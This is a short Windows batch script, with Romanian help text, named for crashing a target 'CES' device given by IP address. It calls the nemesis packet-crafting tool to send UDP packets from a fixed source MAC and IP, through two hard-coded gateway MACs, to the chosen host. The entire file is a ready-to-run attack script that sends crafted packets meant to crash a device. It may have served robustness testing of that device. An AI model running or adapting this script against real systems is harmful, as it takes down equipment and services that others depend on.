@ECHO OFF

IF .%1. == .. GOTO HELP

::MAC GW = 10.2.5.210
nemesis udp -H 00:0D:61:AA:05:1E -M 00:50:bf:e9:fe:21 -S 10.2.5.188 -D %1 -x 0xDEAD -y 0xBEEF

::MAC GW = 10.2.5.141
nemesis udp -H 00:0D:61:AA:05:1E -M 00:e0:7b:02:e8:c1 -S 10.2.5.188 -D %1 -x 0xDEAD -y 0xBEEF


goto end



:HELP
   echo.
   ECHO utilizare:   crash  CES_IP_Address
   echo.
   @ECHO OFF


:END
